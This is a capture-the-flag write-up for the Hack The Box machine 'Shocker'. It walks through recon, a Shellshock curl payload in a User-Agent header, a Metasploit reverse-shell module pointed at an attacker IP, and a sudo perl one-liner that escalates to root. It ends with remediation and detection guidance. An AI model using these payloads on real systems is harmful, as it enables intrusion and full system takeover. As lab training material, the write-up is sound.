# Shocker — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** CGI discovery → Shellshock validation → remote command execution as `shelly` → sudo NOPASSWD `perl` → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- The retained notes contain both the Shellshock proof request and the exact Perl privilege-escalation one-liner.
- Flag values are omitted from the public copy.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Shocker / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.22.186` |
| Starting access | Unauthenticated |
| Services | Apache/80, SSH/2222 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.22.186 -T4 --min-rate 5000
```

Results:

```text
80/tcp    Apache httpd 2.4.18 (Ubuntu)
2222/tcp  OpenSSH 7.2p2 Ubuntu
```

Web enumeration identified `/cgi-bin/user.sh`.

## 04 — Shellshock validation

**ATTACKER**

```bash
curl -i \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
  http://10.129.22.186/cgi-bin/user.sh
```

The response returned the `shelly` UID/GID, confirming code execution through the CGI request.

## 05 — Initial shell

```text
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.129.22.186
set TARGETURI /cgi-bin/user.sh
set LHOST <ATTACKER_IP>
run
```

```bash
whoami
hostname
id
cat /home/shelly/user.txt
```

Flag content is redacted.

## 06 — Sudo enumeration

```bash
sudo -l
```

The retained evidence shows `shelly` could run `/usr/bin/perl` as root without a password.

## 07 — Perl → root

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
id
cat /root/root.txt
```

## 08 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Shellshock permits command execution through CGI | Apache CGI / Bash | Critical |
| 2 | Passwordless sudo Perl provides arbitrary root execution | sudoers | Critical |

### Remediations

- Patch Bash to a non-vulnerable supported release.
- Remove obsolete CGI scripts and disable CGI execution where it is not required.
- Add detections for Shellshock function-prefix payloads.
- Remove `NOPASSWD` sudo permission for Perl and other general-purpose interpreters.

## 09 — Detection opportunities

- HTTP headers beginning with Shellshock-style `() { ... }; ...` payloads.
- CGI processes spawning shells or system utilities.
- `sudo /usr/bin/perl` execution by non-administrative users.
- Perl spawning `/bin/sh` or `/bin/bash` under UID 0.

## 10 — Timeline

1. Nmap exposed Apache/80 and SSH/2222.
2. CGI enumeration identified `user.sh`.
3. A non-destructive Shellshock probe returned `id`.
4. An interactive shell was established as `shelly`.
5. User proof was collected.
6. `sudo -l` revealed passwordless Perl execution.
7. Perl spawned a root shell.
8. Root proof was collected.

**Publication note:** flag values and attacker-specific session data have been removed from this shared copy.
